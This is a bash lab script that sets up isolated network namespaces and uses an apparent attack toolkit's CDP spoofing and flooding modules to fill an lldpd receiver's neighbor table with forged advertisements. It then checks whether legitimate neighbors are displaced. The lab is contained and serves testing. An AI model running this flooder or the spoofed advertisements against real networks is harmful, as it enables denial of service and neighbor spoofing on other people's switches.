#!/usr/bin/env bash
# Isolated CDP flooding lab (Linux only, needs root).
#
# Topology: one bridge (the LAN) with two hosts attached:
#
#   receiver: lldpd in receive-only mode with CDP support, standing in for a Cisco
#             switch that keeps CDP neighbors. Its neighbor table is read with lldpctl.
#   attacker: MACabre's CDP flooder, and a one-off advertisement for a legitimate
#             neighbor, SW-LEGIT, sent before the flood.
#
# Phases:
#   Phase 1 (baseline): the legitimate neighbor advertises once. It is stored.
#   Phase 2 (flood): the attacker sends FLOOD_RATE advertisements per second for
#            FLOOD_SECONDS seconds, each for a random device and address. The lab counts
#            the neighbors the receiver stores and whether SW-LEGIT is still there.
#   Phase 3 (late neighbor): after the flood, a new legitimate neighbor, SW-LATE, advertises
#            once. The lab checks whether the receiver stores it.
#
# The lab measures how many neighbor entries the flood creates, whether the existing
# neighbor survives it, and whether a neighbor that appears after the flood is stored.
# It does not measure the receiver's CPU use. The receiver is lldpd, not a Cisco switch,
# so its table size is lldpd's, not the switch's.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/cdp_flooding_lab.sh
#   sudo FLOOD_RATE=500 FLOOD_SECONDS=10 scripts/lab/cdp_flooding_lab.sh
#
# Requirements: iproute2, lldpd (with CDP support, `lldpd -c`), and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip lldpd lldpctl; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FLOOD_RATE="${FLOOD_RATE:-200}"
FLOOD_SECONDS="${FLOOD_SECONDS:-10}"
LEGIT_NAME="SW-LEGIT"
WORK="$(mktemp -d)"
chmod 755 "$WORK"   # lldpd drops privileges and must reach its control socket here
SOCK=""

stop_receiver() {
    for pid in $(ip netns pids receiver 2>/dev/null || true); do
        kill "$pid" 2>/dev/null || true
    done
    for _ in $(seq 1 10); do
        [[ -z "$(ip netns pids receiver 2>/dev/null || true)" ]] && break
        sleep 0.5
    done
}

stop_lab() {
    stop_receiver
    for ns in attacker receiver lan; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add lan
ip netns add receiver
ip netns add attacker

for pair in "rcv:receiver" "att:attacker"; do
    name="${pair%%:*}"
    ns="${pair##*:}"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns lan
done

ip netns exec lan ip link add br0 type bridge
ip netns exec lan ip link set br0 up
for name in rcv att; do
    ip netns exec lan ip link set "p-$name" master br0
    ip netns exec lan ip link set "p-$name" up
done
ip netns exec receiver ip link set h-rcv up
ip netns exec attacker ip link set h-att up

start_receiver() {
    SOCK="$WORK/lldpd-$RANDOM.sock"
    rm -f "$SOCK"
    ip netns exec receiver lldpd -d -r -c -I h-rcv -u "$SOCK" >>"$WORK/lldpd.log" 2>&1 &
    for _ in $(seq 1 20); do
        [[ -S "$SOCK" ]] && break
        sleep 0.25
    done
    sleep 1
}

neighbors() {
    ip netns exec receiver lldpctl -u "$SOCK" -f keyvalue 2>/dev/null || true
}

LEGIT_CODE='
import os
from macabre.attacks.cdp_spoofing import build_frame
from scapy.all import sendp
name = os.environ["NEIGHBOR"]
sendp(build_frame("02:00:00:00:00:31", name, "Gi0/1", address="10.99.0.2", native_vlan=10),
      iface="h-att", verbose=False)
print(f"Legitimate neighbor: advertised {name} once")
'

FLOOD_CODE='
import os, threading
from macabre.attacks.cdp_flooding import CdpFloodingConfig, run_cdp_flooding
rate = float(os.environ["FLOOD_RATE"])
seconds = int(os.environ["FLOOD_SECONDS"])
stats = run_cdp_flooding(
    CdpFloodingConfig(iface="h-att", rate=rate, count=int(rate * seconds)),
    threading.Event(),
    lambda _: None,
)
print(f"Flooder: sent {stats.frames} advertisements for random devices over about {seconds} s")
'

# Count the neighbor entries the receiver stores, and whether the legitimate neighbor is one of them.
summarize() {
    local out="$1"
    local entries legit
    entries="$(grep -c '\.rid=' "$out" || true)"
    legit="$(grep -c "chassis.name=$LEGIT_NAME" "$out" || true)"
    if (( legit > 0 )); then
        echo "Receiver: $entries neighbor entries stored; $LEGIT_NAME is still stored."
    else
        echo "Receiver: $entries neighbor entries stored; $LEGIT_NAME is no longer stored."
    fi
}

echo "Phase 1: baseline, one advertisement from the legitimate neighbor"
start_receiver
ip netns exec attacker env PYTHONPATH="$ROOT/src" NEIGHBOR="$LEGIT_NAME" "$PY" -c "$LEGIT_CODE"
sleep 3
neighbors > "$WORK/baseline.txt"
summarize "$WORK/baseline.txt"
echo

echo "Phase 2: flood at $FLOOD_RATE advertisements per second for $FLOOD_SECONDS s"
ip netns exec attacker env PYTHONPATH="$ROOT/src" FLOOD_RATE="$FLOOD_RATE" FLOOD_SECONDS="$FLOOD_SECONDS" \
    "$PY" -c "$FLOOD_CODE"
sleep 5
neighbors > "$WORK/flood.txt"
summarize "$WORK/flood.txt"
echo

echo "Phase 3: a legitimate neighbor, SW-LATE, advertises after the flood, same receiver"
ip netns exec attacker env PYTHONPATH="$ROOT/src" NEIGHBOR="SW-LATE" "$PY" -c "$LEGIT_CODE"
sleep 3
neighbors > "$WORK/late.txt"
LATE="$(grep -c 'chassis.name=SW-LATE' "$WORK/late.txt" || true)"
summarize "$WORK/late.txt"
stop_receiver
echo
FLOOD_ENTRIES="$(grep -c '\.rid=' "$WORK/flood.txt" || true)"
BASE_ENTRIES="$(grep -c '\.rid=' "$WORK/baseline.txt" || true)"
SENT_TOTAL="$(( FLOOD_RATE * FLOOD_SECONDS ))"
if (( FLOOD_ENTRIES > BASE_ENTRIES )); then
    echo "Flood: $SENT_TOTAL advertisements for random devices left $FLOOD_ENTRIES neighbor entries stored, from $BASE_ENTRIES before. Vulnerable when CDP is enabled."
else
    echo "Flood: the receiver stored no new neighbors. Result unreliable."
fi
if (( LATE == 0 )); then
    echo "Late neighbor: SW-LATE was not stored after the flood. The flood filled the receiver's neighbor table."
else
    echo "Late neighbor: SW-LATE was stored after the flood. The table was not full."
fi
